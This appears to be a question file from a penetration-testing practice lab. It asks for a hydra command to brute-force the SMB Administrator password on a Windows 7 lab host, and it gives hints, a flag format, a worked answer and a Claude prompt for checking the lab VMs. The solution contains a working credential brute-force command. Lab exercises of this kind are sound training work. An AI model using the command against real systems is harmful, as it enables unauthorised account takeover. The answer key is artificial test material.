# Q098 — SMB Bruteforce Win7

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra`, `john`, `hashcat`, `crackmapexec`, `responder` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use hydra against SMB on Win7 to brute Administrator. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra -l Administrator -P pass.txt smb://192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`smb` module.
</details>

<details>
<summary>Hint 2</summary>

Win7 lockout policy may apply.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l Administrator -P /usr/share/wordlists/fasttrack.txt smb://192.168.52.130
```

Cracks if password in list.

**Answer:** `cmd=hydra -l Administrator -P pass.txt smb://192.168.52.130`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q098".
```
